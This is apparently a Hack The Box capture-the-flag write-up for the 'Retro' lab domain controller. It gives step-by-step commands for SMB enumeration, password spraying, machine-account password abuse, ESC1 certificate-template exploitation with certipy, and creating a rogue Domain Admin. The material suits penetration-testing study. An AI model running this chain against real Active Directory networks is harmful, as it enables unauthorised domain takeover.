# Retro - HTB Writeup

## Recon

We begin with an Nmap scan against the target.

```bash
nmap -sC -sV -Pn 10.129.234.44
```

### Open Ports

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ssl/ldap
3268/tcp  open  ldap
3269/tcp  open  ssl/ldap
3389/tcp  open  ms-wbt-server
```

The scan reveals that the target is a Domain Controller for the `retro.vl` domain.

Important information:

- Domain: `retro.vl`
- Hostname: `dc.retro.vl`
- SMB signing is enabled and required.
- LDAP and Kerberos are available.
- RDP is enabled.

---

# SMB Enumeration

Anonymous access to SMB is allowed.

```bash
smbclient //10.129.234.44/Trainees -N
```

Listing the share reveals an interesting file:

```bash
get Important.txt
```

The note indicates that trainees share a single account because they frequently forget their passwords.

---

# User Enumeration

Users can be enumerated through RID cycling.

Using NetExec:

```bash
nxc smb 10.129.234.44 -u guest -p '' --rid-brute
```

Alternatively:

```bash
impacket-lookupsid anonymous@retro.vl -no-pass
```

After extracting the usernames, save them into `users.txt`.

---

# Password Spraying

Given the hint regarding poor password practices, perform password spraying using the pattern:

```text
username:username
```

```bash
nxc smb 10.129.234.44 -u users.txt -p users.txt
```

Valid credentials discovered:

```text
trainee:trainee
```

---

# Enumerating SMB Shares

Connect using the discovered account.

```bash
impacket-smbclient retro.vl/trainee@10.129.234.44
```

Enumerate the shares and access:

```text
Notes
```

Inside the share:

- Retrieve the user flag.
- Discover a hint referring to a predefined computer account.

---

# Identifying the Target Computer

From RID cycling we already know that two computer accounts exist:

```text
BANKING$
DC$
```

Query LDAP for the `BANKING$` account:

```bash
ldapsearch -X \
-H ldap://10.129.234.44 \
-x \
-D "trainee@retro.vl" \
-w "trainee" \
-b "DC=retro,DC=vl" \
"(sAMAccountName=BANKING$)" "*" "+"
```

The LDAP attributes confirm that `BANKING$` is the machine referenced in the notes.

---

# Compromising the Computer Account

A common mistake in Active Directory labs is assigning predictable passwords to machine accounts.

Trying:

```text
BANKING$:banking
```

works successfully.

---

# Enumerating AD CS

Attempt to enumerate certificate templates:

```bash
certipy-ad find \
-u BANKING$@retro.vl \
-p 'banking' \
-dc-ip 10.129.234.44 \
-vulnerable
```

However, Certipy returns:

```text
NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

Machine accounts cannot authenticate this way, so the password must be changed.

---

# Changing the Machine Password

Change the password using SAMR:

```bash
impacket-changepasswd \
'retro.vl/BANKING$:banking@10.129.234.44' \
-newpass test123 \
-protocol rpc-samr
```

Now enumerate vulnerable templates again:

```bash
certipy-ad find \
-u BANKING$@retro.vl \
-p 'test123' \
-dc-ip 10.129.234.44 \
-vulnerable
```

A vulnerable certificate template is found:

```text
RetroClients
```

---

# ESC1 Exploitation

Retrieve the Administrator SID:

```bash
rpcclient -U "trainee" 10.129.234.44 \
-c 'lookupnames Administrator'
```

Output:

```text
S-1-5-21-2983547755-698260136-4283918172-500
```

Request a certificate as Administrator:

```bash
certipy-ad req \
-u 'BANKING$' \
-p 'test123' \
-dc-ip 10.129.234.44 \
-ca retro-DC-CA \
-template RetroClients \
-upn Administrator \
-target dc.retro.vl \
-key-size 4096 \
-sid S-1-5-21-2983547755-698260136-4283918172-500
```

This yields:

```text
administrator.pfx
```

---

# Authenticating with the Certificate

Authenticate using the generated certificate and open an LDAP shell:

```bash
certipy-ad auth \
-pfx administrator.pfx \
-dc-ip 10.129.234.44 \
-ldap-shell
```

Create a new user:

```text
add_user lowprivuser
```

Set its password:

```text
change_password lowprivuser CustomPassword123!
```

Add the user to Domain Admins:

```text
add_user_to_group lowprivuser "Domain Admins"
```

---

# Gaining Administrative Access

Connect using Evil-WinRM:

```bash
evil-winrm \
-i 10.129.234.44 \
-u lowprivuser \
-p 'CustomPassword123!'
```

Retrieve the root flag:

```text
C:\Users\Administrator\Desktop\
```

---

# Attack Path Summary

1. Enumerated SMB shares anonymously.
2. Found hints in the `Trainees` share.
3. Enumerated users via RID cycling.
4. Password sprayed with `username:username`.
5. Obtained credentials for `trainee`.
6. Accessed the `Notes` share.
7. Identified the `BANKING$` computer account.
8. Logged in using the default password.
9. Enumerated Active Directory Certificate Services.
10. Changed the machine password.
11. Found the vulnerable `RetroClients` template.
12. Exploited ESC1 to request an Administrator certificate.
13. Authenticated with the certificate.
14. Created a new Domain Admin user.
15. Logged in through WinRM and captured the root flag.

---

# Skills Practiced

- SMB enumeration
- RID cycling
- Password spraying
- LDAP enumeration
- Machine account abuse
- AD CS enumeration
- ESC1 exploitation
- Certificate authentication
- LDAP shell abuse
- Domain privilege escalation
- Evil-WinRM
